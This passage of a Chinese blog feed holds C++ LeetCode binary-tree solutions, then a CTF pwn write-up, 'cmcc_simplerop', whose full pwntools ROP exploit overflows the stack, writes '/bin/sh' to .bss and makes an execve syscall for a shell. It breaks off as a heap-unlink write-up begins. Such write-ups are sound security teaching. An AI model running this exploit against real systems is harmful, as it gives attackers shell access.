class="markdownIt-Anchor" href="#法一dfs">#</a> 法一：DFS</h4><p>树的深度等于左子树的深度和右子树深度的最大值 + 1</p><p><img src="https://pic.leetcode-cn.com/9b063f1f2b7ba125b97a2a11c5f774c0f8ff4df594696993a8eb8282750dae0d-Picture1.png" alt="Picture1.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> leftdeep=<span class="built_in">maxDepth</span>(root-&gt;left);</span><br><span class="line">        <span class="type">int</span> rightdeep = <span class="built_in">maxDepth</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(leftdeep,rightdeep)+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="对称二叉树"><a class="markdownIt-Anchor" href="#对称二叉树">#</a> 对称二叉树</h3><blockquote><p>请实现一个函数，用来判断一棵二叉树是不是对称的。如果一棵二叉树和它的镜像一样，那么它是对称的。</p><p>例如，二叉树 [1,2,2,3,4,4,3] 是对称的。</p><p>1<br>/ <br>2   2<br>/ \ / <br>3  4 4  3<br> 但是下面这个 [1,2,2,null,3,null,3] 则不是镜像对称的:</p><p>1<br>/ <br>2   2<br>\   <br>3    3</p></blockquote><p>题解：</p><p>双指针递归剪枝，结束条件为左右指针同时都为空指针返回 true，如果值不同或只有一个为空返回 false</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isSymmetric</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        TreeNode *l=root;</span><br><span class="line">        TreeNode *r=root;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">recv</span>(l,r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">recv</span><span class="params">(TreeNode * l,TreeNode *r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l==<span class="literal">NULL</span>&amp;&amp;r==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(l==<span class="literal">NULL</span>||r==<span class="literal">NULL</span>||l-&gt;val!=r-&gt;val)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;     <span class="comment">//上面两个位置不能调换</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">recv</span>(l-&gt;left,r-&gt;right)&amp;&amp;<span class="built_in">recv</span>(l-&gt;right,r-&gt;left);</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="平衡二叉树"><a class="markdownIt-Anchor" href="#平衡二叉树">#</a> 平衡二叉树</h3><p>平衡二叉树的定义是：二叉树的每个节点的左右子树的高度差的绝对值不超过 11，则二叉树是平衡二叉树。根据定义，一棵二叉树是平衡二叉树，当且仅当其所有子树也都是平衡二叉树，因此可以使用递归的方式判断二叉树是不是平衡二叉树，递归的顺序可以是自顶向下或者自底向上。</p><h4 id="法一-自顶向下递归"><a class="markdownIt-Anchor" href="#法一-自顶向下递归">#</a> 法一： 自顶向下递归</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">height</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(<span class="built_in">height</span>(root-&gt;left), <span class="built_in">height</span>(root-&gt;right)) + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isBalanced</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">abs</span>(<span class="built_in">height</span>(root-&gt;left) - <span class="built_in">height</span>(root-&gt;right)) &lt;= <span class="number">1</span> &amp;&amp; <span class="built_in">isBalanced</span>(root-&gt;left) &amp;&amp; <span class="built_in">isBalanced</span>(root-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>复杂度分析</p><p>时间复杂度：O (n^2)，其中 n 是二叉树中的节点个数。<br>最坏情况下，二叉树是满二叉树，需要遍历二叉树中的所有节点，时间复杂度是 O (n)。<br>对于节点 p，如果它的高度是 d，则 \texttt {height}§height§ 最多会被调用 dd 次（即遍历到它的每一个祖先节点时）。对于平均的情况，一棵树的高度 h 满足 O (h)=O (\log n) O (h)=O (logn)，因为 d \leq hd≤h，所以总时间复杂度为 O (n \log n)。对于最坏的情况，二叉树形成链式结构，高度为 O (n)，此时总时间复杂度为 O (n^2)</p><p>空间复杂度：O (n)，其中 n 是二叉树中的节点个数。空间复杂度主要取决于递归调用的层数，递归调用的层数不会超过 n。</p><h4 id="法二-自底向上递归"><a class="markdownIt-Anchor" href="#法二-自底向上递归">#</a> 法二： 自底向上递归</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">height</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> leftHeight = <span class="built_in">height</span>(root-&gt;left);</span><br><span class="line">        <span class="type">int</span> rightHeight = <span class="built_in">height</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">if</span> (leftHeight == <span class="number">-1</span> || rightHeight == <span class="number">-1</span> || <span class="built_in">abs</span>(leftHeight - rightHeight) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(leftHeight, rightHeight) + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isBalanced</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">height</span>(root) &gt;= <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>复杂度分析</p><p>时间复杂度：O (n)，其中 n 是二叉树中的节点个数。使用自底向上的递归，每个节点的计算高度和判断是否平衡都只需要处理一次，最坏情况下需要遍历二叉树中的所有节点，因此时间复杂度是 O (n)。</p><p>空间复杂度：O (n)，其中 n 是二叉树中的节点个数。空间复杂度主要取决于递归调用的层数，递归调用的层数不会超过 n。</p><h3 id="二叉树剪枝"><a class="markdownIt-Anchor" href="#二叉树剪枝">#</a> 二叉树剪枝</h3><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201262036538.png" alt="image-20220126203658273"></p><p>后序遍历 dfs</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">pruneTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        TreeNode *leftnode = <span class="built_in">pruneTree</span>(root-&gt;left);</span><br><span class="line">        TreeNode *rightnode = <span class="built_in">pruneTree</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;val==<span class="number">0</span> &amp;&amp; leftnode==<span class="literal">NULL</span>&amp;&amp;rightnode == <span class="literal">NULL</span> )</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        root-&gt;left = leftnode;</span><br><span class="line">        root-&gt;right= rightnode;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="寻找最近公共祖先"><a class="markdownIt-Anchor" href="#寻找最近公共祖先">#</a> 寻找最近公共祖先</h3><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201262218379.png" alt="image-20220126221803111"></p><h4 id="法一递归"><a class="markdownIt-Anchor" href="#法一递归">#</a> 法一：递归</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    TreeNode* ans;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">dfs</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">false</span>;   </span><br><span class="line">        <span class="type">bool</span> lson = <span class="built_in">dfs</span>(root-&gt;left, p, q);</span><br><span class="line">        <span class="type">bool</span> rson = <span class="built_in">dfs</span>(root-&gt;right, p, q);</span><br><span class="line">        <span class="keyword">if</span> ((lson &amp;&amp; rson) || ((root-&gt;val == p-&gt;val || root-&gt;val == q-&gt;val) &amp;&amp; (lson || rson)))<span class="comment">//lson&amp;&amp;rson表示左右子树均包含p或q节点，root恰好是p或q且它的左子树或右子树有一个包含了另一个节点的情况</span></span><br><span class="line">        &#123;</span><br><span class="line">            ans = root;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> lson || rson || (root-&gt;val == p-&gt;val || root-&gt;val == q-&gt;val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">dfs</span>(root, p, q);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="法二存储父节点"><a class="markdownIt-Anchor" href="#法二存储父节点">#</a> 法二：存储父节点</h4><p>从根节点开始遍历整棵二叉树，用哈希表记录每个节点的父节点指针。<br>从 p 节点开始不断往它的祖先移动，并用数据结构记录已经访问过的祖先节点。<br>同样，我们再从 q 节点开始不断往它的祖先移动，如果有祖先已经被访问过，即意味着这是 p 和 q 的深度最深的公共祖先，即 LCA 节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map&lt;<span class="type">int</span>, TreeNode*&gt; fa;</span><br><span class="line">    unordered_map&lt;<span class="type">int</span>, <span class="type">bool</span>&gt; vis;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            fa[root-&gt;left-&gt;val] = root;</span><br><span class="line">            <span class="built_in">dfs</span>(root-&gt;left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;right != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            fa[root-&gt;right-&gt;val] = root;</span><br><span class="line">            <span class="built_in">dfs</span>(root-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        fa[root-&gt;val] = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            vis[p-&gt;val] = <span class="literal">true</span>;</span><br><span class="line">            p = fa[p-&gt;val];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (q != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (vis[q-&gt;val]) <span class="keyword">return</span> q;</span><br><span class="line">            q = fa[q-&gt;val];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="二叉搜索树"><a class="markdownIt-Anchor" href="#二叉搜索树">#</a> 二叉搜索树</h3><p>输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的循环双向链表。要求不能创建任何新的节点，只能调整树中节点指针的指向。</p><p>为了让您更好地理解问题，以下面的二叉搜索树为例：</p><p><img src="https://assets.leetcode.com/uploads/2018/10/12/bstdlloriginalbst.png" alt="img"></p><p>我们希望将这个二叉搜索树转化为双向循环链表。链表中的每个节点都有一个前驱和后继指针。对于双向循环链表，第一个节点的前驱是最后一个节点，最后一个节点的后继是第一个节点。</p><p>下图展示了上面的二叉搜索树转化成的链表。“head” 表示指向链表中有最小元素的节点。</p><p><img src="https://assets.leetcode.com/uploads/2018/10/12/bstdllreturndll.png" alt="img"></p><p>特别地，我们希望可以就地完成转换操作。当转化完成以后，树中节点的左指针需要指向前驱，树中节点的右指针需要指向后继。还需要返回链表中的第一个节点的指针。</p><ul><li>思路：</li></ul><p>二叉搜索树 转换成一个 “排序的循环双向链表” ，其中包含三个要素：</p><p>排序链表： 节点应从小到大排序，因此应使用 中序遍历 “从小到大” 访问树的节点。<br>双向链表： 在构建相邻节点的引用关系时，设前驱节点 pre 和当前节点 cur ，不仅应构建 pre.right = cur ，也应构建 cur.left = pre 。<br>循环链表： 设链表头节点 head 和尾节点 tail ，则应构建 head.left = tail 和 tail.right = head 。</p><ul><li>算法流程</li></ul><p>dfs (cur): 递归法中序遍历；</p><p>终止条件： 当节点 cur 为空，代表越过叶节点，直接返回；<br>递归左子树，即 dfs (cur.left) ；<br>构建链表：<br>当 pre 为空时： 代表正在访问链表头节点，记为 head ；<br>当 pre 不为空时： 修改双向节点引用，即 pre.right = cur ， cur.left = pre ；<br>保存 cur ： 更新 pre = cur ，即节点 cur 是后继节点的 pre ；<br>递归右子树，即 dfs (cur.right) ；<br>treeToDoublyList(root)：</p><p>特例处理： 若节点 root 为空，则直接返回；<br>初始化： 空节点 pre ；<br>转化为双向链表： 调用 dfs (root) ；<br>构建循环链表： 中序遍历完成后，head 指向头节点， pre 指向尾节点，因此修改 head 和 pre 的双向节点引用即可；<br>返回值： 返回链表的头节点 head 即可；</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">Node* <span class="title">treeToDoublyList</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(root);</span><br><span class="line">        head-&gt;left = pre;</span><br><span class="line">        pre-&gt;right = head;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Node *pre, *head;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(Node* cur)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(cur == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(cur-&gt;left);</span><br><span class="line">        <span class="keyword">if</span>(pre != <span class="literal">nullptr</span>) pre-&gt;right = cur; <span class="comment">//用pre来查找</span></span><br><span class="line">        <span class="keyword">else</span> head = cur; <span class="comment">//找到头结点</span></span><br><span class="line">        cur-&gt;left = pre;</span><br><span class="line">        pre = cur;</span><br><span class="line">        <span class="built_in">dfs</span>(cur-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>复杂度分析：<br>时间复杂度 O (N)： N 为二叉树的节点数，中序遍历需要访问所有节点。<br>空间复杂度 O (N) ： 最差情况下，即树退化为链表时，递归深度达到 N，系统使用 O (N) 栈空间。</p>]]></content>
      
      
      <categories>
          
          <category> leetcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cmcc_simplerop</title>
      <link href="/2022/01/24/cmcc_simplerop/"/>
      <url>/2022/01/24/cmcc_simplerop/</url>
      
        <content type="html"><![CDATA[<p>系统调用 + rop</p><span id="more"></span><h1 id="cmcc_simplerop"><a class="markdownIt-Anchor" href="#cmcc_simplerop">#</a> cmcc_simplerop</h1><h2 id="程序分析"><a class="markdownIt-Anchor" href="#程序分析">#</a> 程序分析</h2><p>32 位程序，开了 NX，部分 RELRO 保护</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242148415.png" alt="image-20220124214841349"></p><p>主函数存在栈溢出</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242148568.png" alt="image-20220124214824363"></p><p>该题 没有 system 函数和’/bin/sh’，考虑使用 int 80 系统调用，地址为 0x080493e1</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242159336.png" alt="image-20220124215933258"></p><p>设置系统调用 int80 (11,&quot;/bin/sh&quot;,null,null&quot;) 的参数 eax,ebx,ecx,edx</p><p>找到 eax，进行赋值，地址为 0x080bae06</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242247809.png" alt="image-20220124224731633"></p><p>找到 pop edx;pop,ecx;ret，地址为 0x0806e850</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242218036.png" alt="image-20220124221830924"></p><p>接下来调用 read 函数，将 /bin/sh 写入 bss 段，没有开 PIE，bss 地址为绝对地址。</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201242300841.png" alt="image-20220124230033674"></p><h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node4.buuoj.cn&quot;, 29088)</span></span><br><span class="line">p = process(<span class="string">&#x27;./simplerop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_addr = <span class="number">0x0806cd50</span></span><br><span class="line">int_80 = <span class="number">0x080493e1</span></span><br><span class="line">pop_eax_ret = <span class="number">0x080bae06</span></span><br><span class="line">pop_edx_ecx_eax_ret = <span class="number">0x0806e850</span></span><br><span class="line">bss_addr = <span class="number">0x080eb584</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x20</span> + p32(read_addr)       <span class="comment"># 返回到read函数</span></span><br><span class="line">payload += p32(pop_edx_ecx_eax_ret)<span class="comment"># 平衡栈空间</span></span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>)<span class="comment"># read函数的三个参数 </span></span><br><span class="line">payload += p32(pop_eax_ret) + p32(<span class="number">0xb</span>)<span class="comment"># 对eax进行赋值为11</span></span><br><span class="line"><span class="comment"># 对edx、ecx、ebx进行赋值</span></span><br><span class="line">payload += p32(pop_edx_ecx_eax_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bss_addr)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, payload)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hitcontraining_unlink</title>
      <link href="/2022/01/19/hitcontraining_unlink/"/>
      <url>/2022/01/19/hitcontraining_unlink/</url>
      
        <content type="html"><![CDATA[<p>ulink</p><span id="more"></span><h1 id="hitcontraining_unlink"><a class="markdownIt-Anchor" href="#hitcontraining_unlink">#</a> hitcontraining_unlink</h1><h2 id="程序分析"><a class="markdownIt-Anchor" href="#程序分析">#</a> 程序分析</h2><p>检查：64 位程序，开了 NX 和 canary</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201191955197.png" alt="image-20220119195523133"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201192002172.png" alt="image-20220119200216108"></p><p>存在 magic 函数（实际上并没什么用）</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201192004969.png" alt="image-20220119200403815"></p><p>查看主函数及各菜单功能</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201191958337.png" alt="image-20220119195845261"></p><p>show()</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201191958451.png" alt="image-20220119195819384"></p><p>add()</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201191959489.png" alt="image-20220119195919396"></p><p>change()</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201191959852.png" alt="image-20220119195949766"></p><p>在 change_item () 